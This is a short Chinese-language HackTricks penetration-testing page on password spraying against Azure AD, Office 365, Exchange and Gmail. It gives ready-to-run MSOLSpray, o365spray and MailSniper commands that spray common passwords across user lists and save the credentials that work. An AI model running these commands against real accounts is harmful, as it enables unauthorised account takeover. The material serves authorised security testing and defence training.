# Az - Password Spraying

{{#include ../../../banners/hacktricks-training.md}}

## Password Spray

在**Azure**中，这可以针对**不同的API端点**进行，例如Azure AD Graph、Microsoft Graph、Office 365 Reporting webservice等。

然而，请注意，这种技术**非常嘈杂**，蓝队可以**轻易捕捉到**。此外，**强制密码复杂性**和使用**MFA**可能使这种技术变得无用。

您可以使用[**MSOLSpray**](https://github.com/dafthack/MSOLSpray)执行密码喷洒攻击。
```bash
. .\MSOLSpray\MSOLSpray.ps1
Invoke-MSOLSpray -UserList .\validemails.txt -Password Welcome2022! -Verbose
```
或使用 [**o365spray**](https://github.com/0xZDH/o365spray)
```bash
python3 o365spray.py --spray -U validemails.txt -p 'Welcome2022!' --count 1 --lockout 1 --domain victim.com
```
或使用 [**MailSniper**](https://github.com/dafthack/MailSniper)
```bash
#OWA
Invoke-PasswordSprayOWA -ExchHostname mail.domain.com -UserList .\userlist.txt -Password Spring2021 -Threads 15 -OutFile owa-sprayed-creds.txt
#EWS
Invoke-PasswordSprayEWS -ExchHostname mail.domain.com -UserList .\userlist.txt -Password Spring2021 -Threads 15 -OutFile sprayed-ews-creds.txt
#Gmail
Invoke-PasswordSprayGmail -UserList .\userlist.txt -Password Fall2016 -Threads 15 -OutFile gmail-sprayed-creds.txt
```
{{#include ../../../banners/hacktricks-training.md}}
